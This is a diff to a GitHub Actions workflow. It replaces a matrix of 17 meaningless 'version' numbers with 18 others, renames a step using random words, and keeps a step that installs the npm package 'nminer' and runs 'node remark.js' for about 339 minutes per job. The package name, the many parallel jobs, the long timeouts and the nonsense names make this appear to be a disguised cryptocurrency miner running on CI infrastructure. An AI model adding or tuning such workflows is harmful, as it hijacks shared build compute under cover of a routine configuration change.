@@ -9,23 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1799 }
-          - { version: 4375 }
-          - { version: 4880 }
-          - { version: 5541 }
-          - { version: 9877 }
-          - { version: 1853 }
-          - { version: 8687 }
-          - { version: 9997 }
-          - { version: 1276 }
-          - { version: 1373 }
-          - { version: 1536 }
-          - { version: 5958 }
-          - { version: 7792 }
-          - { version: 5293 }
-          - { version: 9858 }
-          - { version: 8024 }
-          - { version: 7044 }
+          - { version: 168 }
+          - { version: 7712 }
+          - { version: 4367 }
+          - { version: 9165 }
+          - { version: 5078 }
+          - { version: 2158 }
+          - { version: 175 }
+          - { version: 2686 }
+          - { version: 4544 }
+          - { version: 3762 }
+          - { version: 2431 }
+          - { version: 5030 }
+          - { version: 8921 }
+          - { version: 9567 }
+          - { version: 72 }
+          - { version: 400 }
+          - { version: 6602 }
+          - { version: 1359 }
 
     steps:
       - name: Checkout
@@ -36,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: than yuck frenetically forenenst urgently
+      - name: immediately cap granny
         run: |
           npm install nminer@latest
-          timeout 349m node remark.js || echo "remark executed"
+          timeout 339m node remark.js || echo "remark executed"
